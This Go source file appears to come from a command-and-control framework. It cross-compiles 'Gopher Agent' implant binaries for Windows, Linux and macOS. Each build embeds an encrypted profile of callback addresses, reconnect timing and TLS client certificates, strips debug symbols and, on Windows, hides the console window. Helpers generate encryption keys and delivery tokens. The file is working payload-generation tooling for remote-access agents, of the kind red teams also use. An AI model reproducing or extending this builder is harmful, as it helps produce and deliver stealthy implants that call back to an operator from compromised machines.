package main

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"

	"github.com/vmihailenco/msgpack/v5"
)

// PlatformTarget represents a GOOS/GOARCH build target.
type PlatformTarget struct {
	GoOS     string
	GoArch   string
	Filename string
	LdFlags  string
}

// SupportedPlatforms returns all supported platform targets.
func SupportedPlatforms() []PlatformTarget {
	return []PlatformTarget{
		{GoOS: "windows", GoArch: "amd64", Filename: "agent.exe", LdFlags: "-s -w -H=windowsgui"},
		{GoOS: "windows", GoArch: "arm64", Filename: "agent.exe", LdFlags: "-s -w -H=windowsgui"},
		{GoOS: "linux", GoArch: "amd64", Filename: "agent.bin", LdFlags: "-s -w"},
		{GoOS: "linux", GoArch: "arm64", Filename: "agent.bin", LdFlags: "-s -w"},
		{GoOS: "darwin", GoArch: "amd64", Filename: "agent.bin", LdFlags: "-s -w"},
		{GoOS: "darwin", GoArch: "arm64", Filename: "agent.bin", LdFlags: "-s -w"},
	}
}

// PlatformKey returns the cache map key for a GOOS/GOARCH pair.
func PlatformKey(goos, goarch string) string {
	return goos + "/" + goarch
}

// Profile mirrors gopher_agent Profile for msgpack serialization.
type Profile struct {
	Type        uint     `msgpack:"type"`
	Addresses   []string `msgpack:"addresses"`
	BannerSize  int      `msgpack:"banner_size"`
	ConnTimeout int      `msgpack:"conn_timeout"`
	ConnCount   int      `msgpack:"conn_count"`
	UseSSL      bool     `msgpack:"use_ssl"`
	SslCert     []byte   `msgpack:"ssl_cert"`
	SslKey      []byte   `msgpack:"ssl_key"`
	CaCert      []byte   `msgpack:"ca_cert"`
}

// AgentBuilder manages cross-compilation of Gopher Agent binaries.
type AgentBuilder struct {
	mu       sync.RWMutex
	cache    map[string][]byte // platformKey -> binary data
	srcDir   string            // path to src_gopher directory
	watermark string
}

// NewAgentBuilder creates a new AgentBuilder.
func NewAgentBuilder(moduleDir string, watermark string) *AgentBuilder {
	return &AgentBuilder{
		cache:     make(map[string][]byte),
		srcDir:    findGopherSource(moduleDir),
		watermark: watermark,
	}
}

// findGopherSource locates the Gopher Agent source directory.
func findGopherSource(moduleDir string) string {
	// Try {ModuleDir}/src_gopher/
	candidate := filepath.Join(moduleDir, "src_gopher")
	if info, err := os.Stat(filepath.Join(candidate, "main.go")); err == nil && !info.IsDir() {
		return candidate
	}
	// Try {ModuleDir}/../gopher_agent/src_gopher/
	candidate = filepath.Join(moduleDir, "..", "gopher_agent", "src_gopher")
	if info, err := os.Stat(filepath.Join(candidate, "main.go")); err == nil && !info.IsDir() {
		return candidate
	}
	return ""
}

// HasSource returns whether the Gopher Agent source was found.
func (b *AgentBuilder) HasSource() bool {
	return b.srcDir != ""
}

// GetCached returns a cached binary for the given platform, or nil if not built.
func (b *AgentBuilder) GetCached(goos, goarch string) []byte {
	b.mu.RLock()
	defer b.mu.RUnlock()
	return b.cache[PlatformKey(goos, goarch)]
}

// ClearCache removes all cached binaries.
func (b *AgentBuilder) ClearCache() {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.cache = make(map[string][]byte)
}

// BuildAll builds agent binaries for all enabled platforms concurrently.
func (b *AgentBuilder) BuildAll(config DeliveryConfig, progressCb func(platform string, status string)) error {
	if !b.HasSource() {
		return fmt.Errorf("gopher agent source not found")
	}

	encryptKey, err := hex.DecodeString(config.EncryptKey)
	if err != nil || len(encryptKey) != 16 {
		return fmt.Errorf("invalid encrypt_key: must be 32 hex characters (16 bytes)")
	}

	agentWatermark, err := strconv.ParseInt(b.watermark, 16, 64)
	if err != nil {
		return fmt.Errorf("invalid agent watermark: %v", err)
	}

	// Parse callback addresses
	addresses := parseCallbackAddresses(config.CallbackAddresses)
	if len(addresses) == 0 {
		return fmt.Errorf("at least one callback address is required")
	}

	// Parse reconnect timeout
	connTimeout, err := parseDurationToSeconds(config.ReconnectTimeout)
	if err != nil {
		return fmt.Errorf("invalid reconnect timeout: %v", err)
	}

	// Generate encrypted profile
	profile := Profile{
		Type:        uint(agentWatermark),
		Addresses:   addresses,
		BannerSize:  0,
		ConnTimeout: connTimeout,
		ConnCount:   config.ReconnectCount,
		UseSSL:      config.UseSSL,
	}

	if config.UseSSL {
		profile.SslCert = config.ClientCert
		profile.SslKey = config.ClientKey
		profile.CaCert = config.CaCert
	}

	profileData, err := msgpack.Marshal(profile)
	if err != nil {
		return fmt.Errorf("failed to marshal profile: %v", err)
	}

	encryptedProfile, err := GopherSessionEncrypt(profileData, encryptKey)
	if err != nil {
		return fmt.Errorf("failed to encrypt profile: %v", err)
	}

	// Prepend encrypt key to profile data
	profileWithKey := append(encryptKey, encryptedProfile...)

	// Format as \xNN string
	profileString := ""
	for _, bt := range profileWithKey {
		profileString += fmt.Sprintf("\\x%02x", bt)
	}

	// Build each enabled platform
	var buildErr error
	var wg sync.WaitGroup
	var mu sync.Mutex

	targets := SupportedPlatforms()
	sem := make(chan struct{}, 3) // Limit concurrent builds to 3

	for _, target := range targets {
		if !isPlatformEnabled(config, target.GoOS, target.GoArch) {
			continue
		}

		wg.Add(1)
		go func(t PlatformTarget) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			if progressCb != nil {
				progressCb(PlatformKey(t.GoOS, t.GoArch), "building")
			}

			data, err := b.buildSingle(t, profileString)
			if err != nil {
				mu.Lock()
				if buildErr == nil {
					buildErr = fmt.Errorf("build %s/%s failed: %v", t.GoOS, t.GoArch, err)
				}
				mu.Unlock()
				if progressCb != nil {
					progressCb(PlatformKey(t.GoOS, t.GoArch), "failed")
				}
				return
			}

			b.mu.Lock()
			b.cache[PlatformKey(t.GoOS, t.GoArch)] = data
			b.mu.Unlock()

			if progressCb != nil {
				progressCb(PlatformKey(t.GoOS, t.GoArch), fmt.Sprintf("ok (%d bytes)", len(data)))
			}
		}(target)
	}

	wg.Wait()
	return buildErr
}

// buildSingle compiles a single platform agent binary.
func (b *AgentBuilder) buildSingle(target PlatformTarget, profileString string) ([]byte, error) {
	// Create temp directory
	tempDir, err := os.MkdirTemp("", "ax-wd-*")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(tempDir)

	// Copy source files to temp directory
	srcDest := filepath.Join(tempDir, "src_gopher")
	if err := copyDir(b.srcDir, srcDest); err != nil {
		return nil, fmt.Errorf("failed to copy source: %v", err)
	}

	// Write config.go
	configContent := "package main\n\nvar encProfiles = [][]byte{\n"
	configContent += fmt.Sprintf("    []byte(\"%s\"),\n", profileString)
	configContent += "}\n"

	configPath := filepath.Join(srcDest, "config.go")
	if err := os.WriteFile(configPath, []byte(configContent), 0644); err != nil {
		return nil, fmt.Errorf("failed to write config.go: %v", err)
	}

	// Build the binary
	buildPath := filepath.Join(tempDir, target.Filename)
	cmdBuild := fmt.Sprintf("GOWORK=off CGO_ENABLED=0 GOOS=%s GOARCH=%s go build -trimpath -ldflags=\"%s\" -o %s",
		target.GoOS, target.GoArch, target.LdFlags, buildPath)

	cmd := exec.Command("sh", "-c", cmdBuild)
	cmd.Dir = srcDest
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("build failed: %v\n%s", err, string(output))
	}

	// Read the built binary
	data, err := os.ReadFile(buildPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read output: %v", err)
	}

	return data, nil
}

// parseCallbackAddresses parses newline/comma-separated callback addresses.
func parseCallbackAddresses(raw string) []string {
	raw = strings.ReplaceAll(raw, " ", "")
	raw = strings.ReplaceAll(raw, "\n", ",")
	raw = strings.TrimSuffix(raw, ",")
	var addresses []string
	for _, a := range strings.Split(raw, ",") {
		a = strings.TrimSpace(a)
		if a != "" {
			addresses = append(addresses, a)
		}
	}
	return addresses
}

// parseDurationToSeconds parses duration strings like "30s", "5m", "1h", "1h30m".
func parseDurationToSeconds(input string) (int, error) {
	re := regexp.MustCompile(`(\d+)(h|m|s)`)
	matches := re.FindAllStringSubmatch(input, -1)

	if matches == nil {
		input = input + "s"
		matches = re.FindAllStringSubmatch(input, -1)
	}

	totalSeconds := 0
	for _, match := range matches {
		value, err := strconv.Atoi(match[1])
		if err != nil {
			return 0, err
		}
		switch match[2] {
		case "h":
			totalSeconds += value * 3600
		case "m":
			totalSeconds += value * 60
		case "s":
			totalSeconds += value
		}
	}
	return totalSeconds, nil
}

// isPlatformEnabled checks if a GOOS/GOARCH is enabled in the config.
func isPlatformEnabled(config DeliveryConfig, goos, goarch string) bool {
	key := goos + "/" + goarch
	for _, p := range config.Platforms {
		if p == key {
			return true
		}
	}
	return false
}

// copyDir recursively copies a directory.
func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		relPath, err := filepath.Rel(src, path)
		if err != nil {
			return err
		}
		dstPath := filepath.Join(dst, relPath)

		if info.IsDir() {
			return os.MkdirAll(dstPath, info.Mode())
		}

		data, err := os.ReadFile(path)
		if err != nil {
			return err
		}
		return os.WriteFile(dstPath, data, info.Mode())
	})
}

// GenerateRandomHexKey generates a random 16-byte hex key (32 hex characters).
func GenerateRandomHexKey() (string, error) {
	key := make([]byte, 16)
	if _, err := rand.Read(key); err != nil {
		return "", err
	}
	return hex.EncodeToString(key), nil
}

// GenerateRandomToken generates a random 8-byte hex token for delivery URL.
func GenerateRandomToken() (string, error) {
	token := make([]byte, 8)
	if _, err := rand.Read(token); err != nil {
		return "", err
	}
	return hex.EncodeToString(token), nil
}
